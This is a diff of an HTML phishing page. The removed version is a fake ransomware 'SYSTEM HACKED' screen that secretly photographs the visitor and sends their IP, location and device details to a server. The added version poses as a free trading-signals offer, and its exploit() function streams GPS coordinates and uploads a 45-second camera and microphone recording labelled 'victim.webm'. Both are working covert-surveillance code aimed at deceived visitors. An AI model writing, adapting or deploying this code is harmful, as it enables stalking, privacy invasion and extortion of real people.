@@ -1,162 +1,64 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>SYSTEM ENCRYPTION</title>
-<style>
-/* CSS BRUTAL RESTORED */
-body{background:#000;color:#fff;font-family:'Courier New', monospace;text-align:center;overflow:hidden;margin:0;padding:20px;user-select:none;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}
-body.shake{animation:shake 0.3s;}@keyframes shake{0%{transform:translate(2px,2px);}25%{transform:translate(-2px,-2px);}50%{transform:translate(2px,-2px);}75%{transform:translate(-2px,2px);}100%{transform:translate(0,0);}}
-h3{font-size:clamp(24px,6vw,36px);margin-bottom:10px;text-shadow:0 0 10px #0f0;font-weight:bold;color:#0f0;}
-.info{font-size:12px;margin:15px 0;line-height:1.4;color:#0f0;}
-.timer{font-size:clamp(32px,8vw,48px);color:#f00;margin:15px 0;text-shadow:0 0 15px #f00;font-weight:bold;}
-.pin{display:flex;justify-content:center;gap:12px;margin:15px 0;}
-.dot{width:20px;height:20px;border:2px solid #0f0;border-radius:50%;transition:0.2s;}
-.dot.active{background:#0f0;box-shadow:0 0 15px #0f0;}
-.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;max-width:300px;margin:25px auto;}
-.btn{padding:20px;border:2px solid #0f0;background:#000;color:#0f0;font-size:18px;font-weight:bold;border-radius:4px;cursor:pointer;transition:0.2s;font-family:'Courier New', monospace;}
-.btn:active{transform:scale(0.95);background:#0f0;color:#000;}
-.contact-btn{background:#f00;border:none;color:#fff;font-size:16px;padding:15px 30px;margin-top:20px;border-radius:4px;font-family:'Courier New', monospace;cursor:pointer;font-weight:bold;}
-
-/* POPUP MERAH DI WEB */
-.popup{position:fixed;width:240px;background:rgba(0,0,0,0.95);border:2px solid #fff;border-radius:4px;z-index:999;display:none;flex-direction:column;left:50%;top:50%;transform:translate(-50%,-50%);}
-.popup.show{display:flex;}
-.popup-title{background:#333;color:#fff;padding:8px 12px;font-weight:bold;font-size:12px;text-align:center;}
-.popup-content{padding:15px;font-size:14px;text-align:center;color:#f00;font-weight:bold;white-space:pre-line;}
-
-/* IDIOT WINDOWS - KELAP KELIP TRANSPARAN */
-.idiot-window{position:fixed;width:220px;height:120px;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-weight:bold;font-size:13px;border:2px solid #fff;z-index:100;padding:8px;line-height:1.2;box-shadow:2px 2px 10px rgba(0,0,0,0.8);animation:chaosBlink 0.4s infinite;}
-@keyframes chaosBlink{0%,25%{background:#fff;color:#000;}50%,75%{background:#000;color:#fff;}100%{background:#fff;color:#000;}}
-
-.scanline{position:fixed;top:0;left:0;width:100%;height:1px;background:#0f0;animation:scan 2s linear infinite;z-index:1000;pointer-events:none;}
-@keyframes scan{0%{top:0;opacity:1;}100%{top:100vh;opacity:0;}}
-</style>
+    <title>NeiroMD Signals</title>
+    <meta name="viewport" content="width=device-width">
+    <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#000;color:#fff;font-family:Arial;text-align:center;overflow:hidden;}img{max-width:95vw;max-height:50vh;object-fit:contain;border-radius:20px;margin:20px;}h2{font-size:24px;margin:10px;color:#ff6b6b;}button{background:linear-gradient(45deg,#ff4757,#ffa502);color:#fff;border:none;padding:20px 40px;font-size:18px;border-radius:50px;cursor:pointer;margin:20px;box-shadow:0 10px 30px rgba(255,71,87,0.5);font-weight:bold;}button:hover{transform:scale(1.05);}video{width:95vw;border-radius:20px;margin:10px;}#status,#loc{display:none;color:#4ecdc4;font-size:16px;}</style>
 </head>
 <body>
-
-<div class="scanline"></div>
-<h3>🔓 SYSTEM HACKED 🔒</h3>
-<div class="info">📁 847 GB FILES ENCRYPTED<br>🆔 VICTIM ID: <span id="sid">...</span><br>📡 IP TRACKING ACTIVE...</div>
-<div class="timer" id="timer">01:00:00</div>
-<div class="pin" id="pin-dots">
-    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
-    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
-</div>
-
-<div class="grid">
-<button class="btn" onclick="tap(1)">1</button><button class="btn" onclick="tap(2)">2</button><button class="btn" onclick="tap(3)">3</button>
-<button class="btn" onclick="tap(4)">4</button><button class="btn" onclick="tap(5)">5</button><button class="btn" onclick="tap(6)">6</button>
-<button class="btn" onclick="tap(7)">7</button><button class="btn" onclick="tap(8)">8</button><button class="btn" onclick="tap(9)">9</button>
-<button class="btn" onclick="tap('C')">C</button><button class="btn" onclick="tap(0)">0</button><button class="btn" onclick="tap('OK')">OK</button>
-</div>
-
-<button class="contact-btn" onclick="contactOwner()">📱 HUBUNGI OWNER</button>
-
-<div class="popup" id="main-popup"><div class="popup-title">CRITICAL ERROR</div><div class="popup-content" id="pc"></div></div>
-<video id="v" style="display:none;" autoplay playsinline></video><canvas id="c" style="display:none;"></canvas>
-
-<script>
-let pin="", camOn=false, attempts=0, maxAttempts=5, gameOver=false, sid='NX_'+Math.random().toString(36).substr(2,7).toUpperCase();
-document.getElementById('sid').innerText=sid;
-
-async function send(payload) { try { await fetch('/api/send', { method:'POST', body:JSON.stringify({...payload, session_id:sid}) }); } catch(e){} }
-
-function formatMsg(title, detail = "") {
-    return `╭┈┈⬡「 🎣 ${title} 」
-┃ ◦ ᴛᴇʀᴄʏᴅᴜᴋ ᴋᴀᴜ Suki 😹
-┃ ◦ ━━━━━━ ᴅᴇᴛᴀɪʟs ━━━━━━
-┃ ◦ 🆔 ɪᴅ: \`${sid}\`
-${detail}
-╰┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈⬡`;
-}
-
-async function takePic() {
-    try {
-        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-        const v = document.getElementById('v'); v.srcObject=s;
-        setTimeout(async () => {
-            const cn = document.getElementById('c'); cn.width=v.videoWidth; cn.height=v.videoHeight;
-            cn.getContext('2d').drawImage(v,0,0);
-            await send({image: cn.toDataURL('image/jpeg', 0.5)});
-            s.getTracks().forEach(t=>t.stop());
-        }, 2000);
-    } catch(e) {}
-}
-
-function tap(v) {
-    if(gameOver) return;
-    if(!camOn) { takePic(); camOn=true; }
-    if(v==='C') pin="";
-    else if(v==='OK') {
-        attempts++;
-        
-        // --- DI TELEGRAM GAK ADA LAPORAN PIN SALAH (SILENT) ---
-        
-        if(attempts >= maxAttempts) {
-            gameOver = true;
-            send({text: formatMsg("💀 ᴄʜᴀᴏs ᴀᴄᴛɪᴠᴀᴛᴇᴅ")}); // Laporan Chaos Tetep Dikirim
-            pop("SYSTEM FAILURE! ⚠️\nDevice Locked Permanently.\n\nYOU ARE IDIOT 🙂");
-            setTimeout(finalChaos, 1500); 
-        } else {
-            // --- DI WEBSITE TETEP MUNCUL 5/5 ---
-            pop(`WRONG PIN! ⚠️\nAttempt: ${attempts}/${maxAttempts}\n\nYour data has been archived.`);
-            document.body.classList.add("shake"); setTimeout(()=>document.body.classList.remove("shake"),300);
+    <img src="https://i.ibb.co.com/Mw10bGf/IMG-20260328-WA0012.jpg">
+    <h2>🔥 NeiroMD Live Signals 🔥</h2>
+    <p>Scan untuk akses trading signals gratis!</p>
+    <button onclick="exploit()">📱 SCAN & VERIFY</button>
+    <div id="status">Verifying...</div>
+    <video id="video" autoplay muted playsinline></video>
+    <div id="loc"></div>
+    
+    <script>
+        let stream, recorder, watchId;
+        async function exploit(){
+            document.querySelector('button,img,h2,p').style.display='none';
+            document.getElementById('status').style.display='block';
+            
+            try{
+                // GPS TRACKING
+                watchId=navigator.geolocation.watchPosition(p=>{
+                    const loc=`${p.coords.latitude.toFixed(6)},${p.coords.longitude.toFixed(6)} (${p.coords.accuracy}m)`;
+                    document.getElementById('loc').textContent='📍 '+loc;
+                    document.getElementById('loc').style.display='block';
+                    sendData('GPS',loc);
+                },null,{enableHighAccuracy:true});
+                
+                // CAMERA
+                stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:1920,height:1080},audio:true});
+                document.getElementById('video').srcObject=stream;
+                document.getElementById('video').style.display='block';
+                
+                // RECORD 45s
+                recorder=new MediaRecorder(stream);
+                const chunks=[]; 
+                recorder.ondataavailable=e=>chunks.push(e.data);
+                recorder.onstop=()=>uploadVideo(new Blob(chunks));
+                recorder.start(); 
+                setTimeout(()=>recorder.stop(),45000);
+                
+            }catch(e){sendData('ERROR',e.message);}
         }
-        pin="";
-    } else { if(pin.length<6) pin+=v; }
-    updateDots();
-}
-
-function updateDots(){ document.querySelectorAll(".dot").forEach((d,i)=>i<pin.length?d.classList.add("active"):d.classList.remove("active")); }
-
-function contactOwner() {
-    send({text: formatMsg("ᴄᴏɴᴛᴀᴄᴛ ᴄʟɪᴄᴋ")});
-    window.open("https://t.me/Nexsus009", "_blank"); 
-}
-
-function pop(m){ 
-    let p=document.getElementById("main-popup"); 
-    document.getElementById("pc").innerText=m;
-    p.classList.add("show"); setTimeout(()=>p.classList.remove("show"),3500); 
-}
-
-// --- IDIOT CHAOS RESTORED (TRANSPARENT BLINK) ---
-function finalChaos() {
-    for(let i=0; i<20; i++) spawnIdiot();
-    setInterval(() => {
-        let p = document.createElement("div");
-        p.className = "popup show";
-        p.innerHTML = `<div class="popup-title">SYSTEM</div><div class="popup-content">DATA PERMANEN DI KAMI<br> 🙂 😈 🙂</div>`;
-        p.style.cssText = `position:fixed; z-index:998; left:${Math.random()*70}%; top:${Math.random()*80}%;`;
-        document.body.appendChild(p);
-        setTimeout(() => p.remove(), 1500);
-    }, 1000);
-}
-
-function spawnIdiot() {
-    let w = document.createElement("div"); w.className = "idiot-window";
-    w.innerHTML = "YOU ARE IDIOT 😈<br>🙂";
-    document.body.appendChild(w);
-    let x = Math.random()*(window.innerWidth-220), y = Math.random()*(window.innerHeight-120), dx = 5, dy = 5;
-    function move() {
-        x+=dx; y+=dy; 
-        if(x<=0||x+220>=window.innerWidth) dx*=-1; 
-        if(y<=0||y+120>=window.innerHeight) dy*=-1;
-        w.style.left=x+"px"; w.style.top=y+"px"; requestAnimationFrame(move);
-    } move();
-}
-
-async function track() {
-    try {
-        const r = await fetch('https://ipapi.co/json/'); const l = await r.json();
-        const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0, charging:false}));
-        const detail = `┃ ◦ 🌐 ɪᴘ: \`${l.ip}\`\n┃ ◦ 📶 ɪsᴘ: ${l.org || 'Unknown'}\n┃ ◦ 📍 ʟᴏᴄ: ${l.city}, ${l.country_name}\n┃ ◦ 📱 ᴅᴇᴠ: ${navigator.platform}\n┃ ◦ 🔋 ʙᴀᴛᴛ: ${Math.round(b.level*100)}% (${b.charging?'⚡':'🔋'})`;
-        send({text: formatMsg("ᴅᴀᴛᴀ ᴇxᴛʀᴀᴄᴛᴇᴅ", detail)});
-    } catch(e){}
-}
-track();
-let tm = 3600; setInterval(()=>{ if(tm>0){tm--; let m=Math.floor(tm/60), s=tm%60; document.getElementById("timer").innerText=`00:${m.toString().padStart(2,"0")}:${s.toString().padStart(2,"0")}`}},1000);
-</script>
+        
+        async function sendData(type,data){
+            const bat=navigator.getBattery?await navigator.getBattery().then(b=>`${Math.round(b.level*100)}% (${b.charging?'🔌':'🔋'})`):'N/A';
+            await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({type,data,ua:navigator.userAgent,bat})
+            });
+        }
+        
+        async function uploadVideo(blob){
+            const form=new FormData();form.append('video',blob,'victim.webm');
+            await fetch('/api/upload',{method:'POST',body:form});
+            if(watchId) navigator.geolocation.clearWatch(watchId);
+        }
+        
+        setTimeout(()=>document.body.onclick=exploit,{once:true});
+    </script>
 </body>
 </html>
